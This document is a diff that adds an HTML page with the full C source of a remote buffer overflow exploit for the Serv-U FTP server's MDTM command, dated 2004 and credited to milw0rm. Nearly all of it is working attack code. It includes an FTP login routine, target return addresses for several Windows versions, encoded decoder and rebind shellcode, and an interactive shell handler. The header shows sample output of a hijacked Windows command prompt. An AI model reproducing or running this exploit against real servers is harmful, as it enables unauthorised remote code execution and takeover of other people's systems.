@@ -1,0 +1,582 @@
+<html><head><title>Serv-U FTPD 3.x/4.x/5.x (MDTM) Remote Overflow Exploit</title></head><pre>/* ex_servu.c - Serv-U FTPD 3.x/4.x/5.x &quot;MDTM&quot; Command remote overflow exploit
+*
+* Copyright (c) SST 2004 All rights reserved.
+*
+* Public version
+*
+* BUG find by bkbll (bkbll@cnhonker.com), cool! :ppPPppPPPpp :D
+*
+* code by Sam and  2004/01/07
+*      &lt;chen_xiaobo@venustech.com.cn&gt;
+*                     &lt;Sam@0x557.org&gt;
+*                    
+*
+* Revise History:
+*      2004/01/14 add rebind shellcode :&gt; we can bind shellport at ftpd port.
+*      2004/01/09 connect back shellcode added :)
+*      2004/01/08 21:04 upgrade now :), we put shellcode in file parameter
+*       we can attack pacthed serv-U;PPPp by airsupply
+*  2004/01/08 change shellcode working on serv-u 4.0/4.1/4.2 now 
+*      :D thx airsupply
+*
+* Compile: gcc -o ex_servu ex_servu.c
+*
+* how works?
+* [root@core exp]# ./sv -h 192.168.10.119 -t 3
+* Serv-U FTPD 3.x/4.x MDTM Command remote overflow exploit
+* bug find by bkbll (bkbll@cnhonker.com) code by Sam (Sam@0x557.org)
+*
+* # Connecting......
+*  [+] Connected.
+*  [*] USER ftp .
+*  [*] 10 bytes send.
+*  [*] PASS sst@SERV-u .
+*  [*] 17 bytes send.
+*  [+] login success .
+*  [+] remote version: Serv-U v4.x with Windows XP EN SP1
+*  [+] trigger vulnerability !
+*   [+] 1027 bytes overflow strings sent!
+*  [+] successed!!
+*
+*
+*  Microsoft Windows XP [Version 5.1.2600]
+*  (C) Copyright 1985-2001 Microsoft Corp.
+*
+*  [Sam Chen@SAM C:\]#
+*
+*
+* some thanks/greets to:
+* bkbll (he find this bug :D), airsupply, kkqq, icbm
+* and everyone else who's KNOW SST;P
+* http://0x557.org
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netinet/tcp.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;string.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/time.h&gt;
+
+#define VER &quot;v5.0&quot;
+
+#define clearbit(buff)          bzero(buff, sizeof (buff));
+#define padding(buff, a)        memset(buff, a, sizeof (buff));
+
+#define MAX_LEN         2048
+#define MAX_NUM         4
+
+int     x = 0, port = 21, shellport;
+char    pass[20], user[20];
+
+struct archs {
+       char            *desc;
+       unsigned int    magic;
+
+}architectures[] = {
+
+
+       {
+               &quot;Serv-U v3.x/4.x/5.x  with Windows 2K CN&quot;,   //winmm.dll
+               0x77535985
+
+       },
+        {
+               &quot;Serv-U v3.x/4.x/5.x  with Windows 2K BIG5 version&quot;,   //winmm.dll
+                0x77531790
+
+       },
+       {
+               &quot;Serv-U v3.x/4.x/5.x  with Windows 2K EN&quot;,
+               0x77575985
+
+       },
+
+       {
+               &quot;Serv-U v3.x/4.x/5.x  with Windows XP CN SP1&quot;,
+               0x76b12f69
+
+       },
+       {
+               &quot;Serv-U v3.x/4.x/5.x  with Windows XP EN SP1&quot;,
+               0x76b42a3a
+
+}
+
+};
+
+char decoder [] =
+/* 36 bytes cool decoder by airsupply :) */
+
+&quot;\x90\x90\x90\x5E\x5F\x5B\xBE\x52\x52\x49\x41\x46\xBF\x52\x52\x31&quot;
+&quot;\x41\x47\x43\x39\x3B\x75\xFB\x4B\x80\x33\x99\x39\x73\xFC\x75\xF7&quot;
+&quot;\xFF\xD3\x90\x90&quot;;
+
+/* fork + rebind shellcode  by airsupply (one way shellcode) */
+char    shellcode [] =
+
+&quot;\x53\x52\x49\x41&quot;
+
+/*port offset 120 + 4*/
+&quot;\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12\xD9\x85\x12\x99\x12\xD9&quot;
+&quot;\x91\x18\x75\x19\x98\x99\x99\x12\x65\x12\x76\x32\x70\x8B\x9B\x99&quot;
+&quot;\x99\xC7\xAA\x50\x28\x90\x66\xEE\x65\x71\xB9\x98\x99\x99\xF1\xF5&quot;
+&quot;\xF5\x99\x99\xF1\xAA\xAB\xB7\xFD\xF1\xEE\xEA\xAB\xC6\xCD\x66\xCC&quot;
+&quot;\x9D\x32\xAA\x50\x28\x9C\x66\xEE\x65\x71\x99\x98\x99\x99\x12\x6C&quot;
+&quot;\x71\x94\x98\x99\x99\xAA\x66\x18\x75\x09\x98\x99\x99\xCD\xF1\x98&quot;
+&quot;\x98\x99\x99\x66\xCF\xB5\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF&quot;
+&quot;\xA9\x12\x41\xCE\xCE\xF1\x9B\x99\x8C\x5B\x12\x55\xCA\xC8\xF3\x8F&quot;
+&quot;\xC8\xCA\x66\xCF\xAD\xC0\xC2\x1C\x59\xEC\x68\xCE\xCA\x66\xCF\xA1&quot;
+&quot;\xCE\xC8\xCA\x66\xCF\xA5\x12\x49\x10\x1F\xD9\x98\x99\x99\xF1\xFC&quot;
+&quot;\xE1\xFC\x99\xF1\xFA\xF4\xFD\xB7\x10\x3F\xA9\x98\x99\x99\x1A\x75&quot;
+&quot;\xCD\x14\xA5\xBD\xAA\x59\xAA\x50\x1A\x58\x8C\x32\x7B\x64\x5F\xDD&quot;
+&quot;\xBD\x89\xDD\x67\xDD\xBD\xA5\x67\xDD\xBD\xA4\x10\xCD\xBD\xD1\x10&quot;
+&quot;\xCD\xBD\xD5\x10\xCD\xBD\xC9\x14\xDD\xBD\x89\x14\x27\xDD\x98\x99&quot;
+&quot;\x99\xCE\xC9\xC8\xC8\xC8\xD8\xC8\xD0\xC8\xC8\x66\x2F\xA9\x98\x99&quot;
+&quot;\x99\xC8\x66\xCF\x91\xAA\x59\xD1\xC9\x66\xCF\x95\xCA\xCC\xCF\xCE&quot;
+&quot;\x12\xF5\xBD\x81\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81&quot;
+&quot;\x12\xC3\xB9\x9A\x44\x7A\xA9\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65&quot;
+&quot;\xAA\x59\x35\xA3\x79\xED\x9E\x58\x56\x9E\x9A\x61\x72\x6B\xA2\xE5&quot;
+&quot;\xBD\x8D\xEC\x78\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85&quot;
+&quot;\x9A\x44\x12\x9D\x12\x9A\x5C\xC6\xC7\xC4\xC2\x5B\x9D\x99\xC8\x66&quot;
+&quot;\xED\xBD\x91\x34\xC9\x71\x3B\x66\x66\x66\x1A\x5D\x9D\xC0\x32\x7B&quot;
+&quot;\x74\x5A\xF1\xFC\xE1\xFC\x99\xF1\xFA\xF4\xFD\xB7\x10\x3F\xA9\x98&quot;
+&quot;\x99\x99\x1A\x75\xCD\x14\xA5\xBD\xAA\x59\xAA\x50\x1A\x58\x8C\x32&quot;
+&quot;\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD\xBD\xA5\x67\xDD\xBD\xA4\x10&quot;
+&quot;\xDD\xBD\xD1\x10\xDD\xBD\xD5\x10\xDD\xBD\xC9\x14\xDD\xBD\x89\x14&quot;
+&quot;\x27\xDD\x98\x99\x99\xCE\xC9\xC8\xC8\xF3\x9D\xC8\xC8\xC8\x66\x2F&quot;
+&quot;\xA9\x98\x99\x99\xC8\x66\xCF\x91\x18\x75\x99\x9D\x99\x99\xF1\x9E&quot;
+&quot;\x99\x98\x99\xCD\x66\x2F\xD1\x98\x99\x99\x66\xCF\x89\xF3\xD9\xF1&quot;
+&quot;\x99\x89\x99\x99\xF1\x99\xC9\x99\x99\xF3\x99\x66\x2F\xDD\x98\x99&quot;
+&quot;\x99\x66\xCF\x8D\x10\x1D\xBD\x21\x99\x99\x99\x10\x1D\xBD\x2D\x99&quot;
+&quot;\x99\x99\x12\x15\xBD\xF9\x9D\x99\x99\x5E\xD8\x62\x09\x09\x09\x09&quot;
+&quot;\x5F\xD8\x66\x09\x1A\x70\xCC\xF3\x99\xF1\x99\x89\x99\x99\xC8\xC9&quot;
+&quot;\x66\x2F\xDD\x98\x99\x99\x66\xCF\x81\xCD\x66\x2F\xD1\x98\x99\x99&quot;
+&quot;\x66\xCF\x85\x66\x2F\xD1\x98\x99\x99\x66\xCF\xB9\xAA\x59\xD1\xC9&quot;
+&quot;\x66\xCF\x95\x71\x70\x64\x66\x66\xAB\xED\x08\x95\x50\x25\x3F\xF2&quot;
+&quot;\x16\x6B\x81\xF8\x51\xCE\xD6\x88\x68\xE2\x05\x76\xC1\x96\xD8\x0E&quot;
+&quot;\x51\xCE\xD6\x8E\x4F\x15\x07\x6A\xFA\x10\x48\xD6\xA4\xF3\x2D\x19&quot;
+&quot;\xB4\xAB\xE1\x47\xFD\x89\x3E\x44\x95\x06\x4A\xD2\x28\x87\x0E\x98&quot;
+&quot;\x06\x06\x06\x06&quot;
+&quot;\x53\x52\x31\x41&quot;;
+
+
+/* new:
+* tcp connect with no block socket, host to ip.
+* millisecond timeout, it's will be fast.
+*;D
+* 2003/06/23 add by Sam
+*/
+int new_tcpConnect (char *host, unsigned int port, unsigned int timeout)
+{
+       int                     sock,
+                               flag,
+                               pe = 0;
+       size_t                  pe_len;
+       struct timeval          tv;
+       struct sockaddr_in      addr;
+       struct hostent*         hp = NULL;
+       fd_set                  rset;
+
+       // reslov hosts
+       hp = gethostbyname (host);
+       if (NULL == hp) {
+               perror (&quot;tcpConnect:gethostbyname\n&quot;);
+               return -1;
+       }
+
+       sock = socket (AF_INET, SOCK_STREAM, 0);
+       if (-1 == sock) {
+               perror (&quot;tcpConnect:socket\n&quot;);
+               return -1;
+       }
+
+       addr.sin_addr = *(struct in_addr *) hp-&gt;h_addr;
+       addr.sin_family = AF_INET;
+       addr.sin_port = htons (port);
+
+       /* set socket no block
+        */
+       flag = fcntl (sock, F_GETFL);
+       if (-1 == flag) {
+               perror (&quot;tcpConnect:fcntl\n&quot;);
+               close (sock);
+               return -1;
+       }
+
+       flag |= O_NONBLOCK;
+       if (fcntl (sock, F_SETFL, flag) &lt; 0) {
+               perror (&quot;tcpConnect:fcntl\n&quot;);
+               close (sock);
+               return -1;
+       }
+
+       if (connect (sock, (const struct sockaddr *) &amp;addr,
+                           sizeof(addr)) &lt; 0 &amp;&amp;
+           errno != EINPROGRESS) {
+               perror (&quot;tcpConnect:connect\n&quot;);
+               close (sock);
+               return -1;
+       }
+
+       /* set connect timeout
+        * use millisecond
+        */
+       tv.tv_sec = timeout/1000;
+       tv.tv_usec = timeout%1000;
+
+       FD_ZERO (&amp;rset);
+       FD_SET (sock, &amp;rset);
+
+       if (select (sock+1, &amp;rset, &amp;rset, NULL, &amp;tv) &lt;= 0) {
+//                perror (&quot;tcpConnect:select&quot;);
+               close (sock);
+               return -1;
+       }
+
+       pe_len = sizeof (pe);
+
+       if (getsockopt (sock, SOL_SOCKET, SO_ERROR, &amp;pe, &amp;pe_len) &lt; 0) {
+               perror (&quot;tcpConnect:getsockopt\n&quot;);
+               close (sock);
+               return -1;
+       }
+
+       if (pe != 0) {
+               errno = pe;
+               close (sock);
+               return -1;
+       }
+
+       if (fcntl(sock, F_SETFL, flag&amp;~O_NONBLOCK) &lt; 0) {
+               perror (&quot;tcpConnect:fcntl\n&quot;);
+               close (sock);
+               return -1;
+       }
+
+       pe = 1;
+       pe_len = sizeof (pe);
+
+       if (setsockopt (sock, IPPROTO_TCP, TCP_NODELAY, &amp;pe, pe_len) &lt; 0){
+               perror (&quot;tcpConnect:setsockopt\n&quot;);
+               close (sock);
+               return -1;
+       }
+
+       return sock;
+}
+
+/* rip code, from hsj */
+int sh (int in, int out, int s)
+{
+       char    sbuf[128], rbuf[128];
+       int     i,
+               ti, fd_cnt,
+               ret=0, slen=0, rlen=0;
+       fd_set  rd, wr;
+
+       fd_cnt = in &gt; out ? in : out;
+       fd_cnt = s &gt; fd_cnt ? s : fd_cnt;
+       fd_cnt ++;
+
+       for (;;) {
+               FD_ZERO (&amp;rd);
+               if (rlen &lt; sizeof (rbuf))
+                       FD_SET (s, &amp;rd);
+               if (slen &lt; sizeof (sbuf))
+                       FD_SET (in, &amp;rd);
+
+               FD_ZERO (&amp;wr);
+               if (slen)
+                       FD_SET (s, &amp;wr);
+               if (rlen)
+                       FD_SET (out, &amp;wr);
+
+               if ((ti = select (fd_cnt, &amp;rd, &amp;wr, 0, 0)) == (-1))
+                       break;
+               if (FD_ISSET (in, &amp;rd)) {
+                       if((i = read (in, (sbuf+slen),
+                       (sizeof (sbuf) - slen))) == (-1)) {
+                               ret = -2;
+                               break;
+                       }
+                       else if (i == 0) {
+                               ret = -3;
+                               break;
+                       }
+                       slen += i;
+                       if (!(--ti))
+                               continue;
+               }
+               if (FD_ISSET (s, &amp;wr)) {
+                       if ((i = write (s, sbuf, slen)) == (-1))
+                               break;
+                       if (i == slen)
+                               slen = 0;
+                       else {
+                               slen -= i;
+                               memmove (sbuf, sbuf + i, slen);
+                       }
+                       if (!(--ti))
+                               continue;
+               }
+               if (FD_ISSET (s, &amp;rd)) {
+                       if ((i = read (s, (rbuf + rlen),
+                       (sizeof (rbuf) - rlen))) &lt;= 0)
+                               break;
+                       rlen += i;
+                       if (!(--ti))
+                               continue;
+               }
+               if (FD_ISSET (out, &amp;wr)) {
+                       if ((i = write (out, rbuf, rlen)) == (-1))
+                               break;
+                       if (i == rlen)
+                               rlen = 0;
+                       else {
+                               rlen -= i;
+                               memmove (rbuf, rbuf+i, rlen);
+                       }
+               }
+       }
+       return ret;
+}
+
+
+int new_send (int fd, char *buff, size_t len)
+{
+       int     ret;
+
+       if ((ret = send (fd, buff, len, 0)) &lt;= 0) {
+               perror (&quot;new_write&quot;);
+               return -1;
+       }
+
+       return ret;
+
+}
+
+int new_recv (int fd, char *buff, size_t len)
+{
+       int     ret;
+
+       if ((ret = recv (fd, buff, len, 0)) &lt;= 0) {
+               perror (&quot;new_recv&quot;);
+               return -1;
+       }
+
+       return ret;
+}
+
+int ftp_login (char *hostName, short port, char *user, char *pass)
+{
+       int     ret, sock;
+       char    buff[MAX_LEN];
+
+       fprintf (stderr, &quot;# Connecting...... \n&quot;);
+       if ((sock = new_tcpConnect (hostName, port, 4000)) &lt;= 0) {
+               fprintf (stderr, &quot;[-] failed. \n&quot;);
+               return -1;
+       }
+
+       clearbit (buff);
+
+       new_recv (sock, buff, sizeof (buff) - 1);
+       if (!strstr (buff, &quot;220&quot;)) {
+               fprintf (stderr, &quot;[-] failed. \n&quot;);
+               return -1;
+       }
+       fprintf (stderr, &quot;[+] Connected. \n&quot;);
+
+       sleep (1);
+       fprintf (stderr, &quot;[*] USER %s .\n&quot;, user);
+       clearbit (buff);
+       snprintf (buff, sizeof (buff), &quot;USER %s\r\n&quot;,  user);
+       ret = new_send (sock, buff, strlen (buff));
+       fprintf (stderr, &quot;[*] %d bytes send. \n&quot;, ret);
+
+       sleep (1);
+
+       clearbit (buff);
+       new_recv (sock, buff, sizeof (buff) - 1);
+       if (!strstr (buff, &quot;331&quot;)) {
+               fprintf (stderr, &quot;[-] user failed. \n%s\n&quot;, buff);
+               return -1;
+       }
+
+       fprintf (stderr, &quot;[*] PASS %s .\n&quot;, pass);
+       clearbit (buff);
+       snprintf (buff, sizeof (buff), &quot;PASS %s\r\n&quot;, pass);
+       ret = new_send (sock, buff, strlen (buff));
+       fprintf (stderr, &quot;[*] %d bytes send. \n&quot;, ret);
+
+       sleep (1);
+
+       clearbit (buff);
+       new_recv (sock, buff, sizeof (buff) - 1);
+       if (!strstr (buff, &quot;230&quot;)) {
+               fprintf (stderr, &quot;[-] pass failed. \n%s\n&quot;, buff);
+               return -1;
+       }
+
+       fprintf (stderr, &quot;[+] login success .\n&quot;);
+
+       return sock;
+
+}
+
+void do_overflow (int sock)
+{
+       int             ret, i;
+       unsigned short newport;
+       char    Comand [MAX_LEN] = {0}, chmodBuffer [600], rbuf[256];
+
+       clearbit (Comand);
+       clearbit (rbuf);
+
+       clearbit (chmodBuffer);
+       
+       for(i = 0; i &lt; 47; i++) 
+        strcat(chmodBuffer, &quot;a&quot;);
+for(i = 0; i &lt; 16; i += 8) {
+        *(unsigned int*)&amp;chmodBuffer[47+i] = 0x06eb9090;
+        *(unsigned int*)&amp;chmodBuffer[51+i] = architectures[x].magic; //0x1002bd78;  //pop reg pop reg ret
+}
+
+
+newport = htons (shellport)^(unsigned short)0x9999;
+memcpy (&amp;shellcode[120 + 4], &amp;newport, 2);
+
+ strcat(chmodBuffer, decoder);
+ 
+
+       fprintf (stderr, &quot;[+] remote version: %s\n&quot;, architectures[x].desc);
+
+       fprintf (stderr, &quot;[+] trigger vulnerability !\n &quot;);
+       strcpy (Comand, &quot;MDTM 20031111111111+&quot;);
+       strncat (Comand, chmodBuffer, strlen (chmodBuffer) - 1);
+       strcat (Comand, &quot; &quot;);
+
+
+       strcat (Comand, shellcode);
+      
+       strcat (Comand, &quot;hacked_by.sst\r\n&quot;);
+
+       ret =  new_send (sock, Comand, strlen (Comand));
+       fprintf (stderr, &quot;[+] %d bytes overflow strings sent!\n&quot;, ret);
+
+
+       return;
+}
+
+/* print help messages.
+* just show ya how to use.
+*/
+void showHELP (char *p)
+{
+       int     i;
+
+       fprintf (stderr, &quot;Usage: %s [Options] \n&quot;, p);
+       fprintf (stderr, &quot;Options:\n&quot;
+               &quot;\t-h [remote host]\tremote host\n&quot;
+               &quot;\t-P [server port]\tserver port\n&quot;
+               &quot;\t-t [system type]\tchoice the system type\n&quot;
+               &quot;\t-u [user   name]\tlogin with this username\n&quot;
+               &quot;\t-p [pass   word]\tlogin with this passwd\n&quot;
+               &quot;\t-d [shell  port]\trebind using this port (default: ftpd port)\n\n&quot;);
+
+
+       printf (&quot;num . description\n&quot;);
+       printf (&quot;----+-----------------------------------------------&quot;
+               &quot;--------\n&quot;);
+       for (i = 0; i &lt;= MAX_NUM; i ++) {
+               printf (&quot;%3d | %s\n&quot;, i, architectures[i].desc);
+       }
+       printf (&quot;    '\n&quot;);
+       return;
+}
+
+int main (int c, char *v[])
+{
+       int             ch, fd, sd;
+       char     *hostName = NULL, *userName = &quot;ftp&quot;, *passWord = &quot;sst@SERV-u&quot;;
+       shellport  = port;
+       
+
+       fprintf (stderr, &quot;Serv-U FTPD 3.x/4.x/5.x MDTM Command remote overflow exploit &quot;VER&quot;\n&quot;
+               &quot;bug find by bkbll (bkbll@cnhonker.net) code by Sam (Sam@0x557.org)\n\n&quot;);
+
+       if (c &lt; 2) {
+               showHELP (v[0]);
+               exit (1);
+       }
+
+       while((ch = getopt(c, v, &quot;h:t:u:p:P:c:d:&quot;)) != EOF) {
+               switch(ch) {
+                       case 'h':
+                               hostName = optarg;
+                               break;
+                       case 't':
+                               x = atoi (optarg);
+                               if (x &gt; MAX_NUM) {
+                                       printf (&quot;[-] wtf your input?\n&quot;);
+                                       exit (-1);
+                               }
+                               break;
+                       case 'u':
+                               userName = optarg;
+                               break;
+                       case 'p':
+                               passWord = optarg;
+                               break;
+                       case 'P':
+                        port = atoi (optarg);
+                        break;
+                       case 'd':
+                        shellport = atoi (optarg);
+                        break;
+                       default:
+                               showHELP (v[0]);
+                               return 0;
+               }
+       }
+
+
+       fd = ftp_login (hostName, port, userName, passWord);
+       if (fd &lt;= 0) {
+               printf (&quot;[-] can't connnect\n&quot;);
+               exit (-1);
+       }
+
+       do_overflow (fd);
+
+close (fd);
+ 
+       sleep (3);
+      
+       sd = new_tcpConnect (hostName, shellport, 3000);
+       if (sd &lt;= 0) {
+               printf (&quot;[-] failed\n&quot;);
+               return -1;
+       }
+
+       fprintf (stderr, &quot;[+] successed!!\n\n\n&quot;);
+       sh (0, 1, sd);
+
+       close (sd);
+
+       return 0;
+}
+
+
+
+// milw0rm.com [2004-02-27]</pre></html>
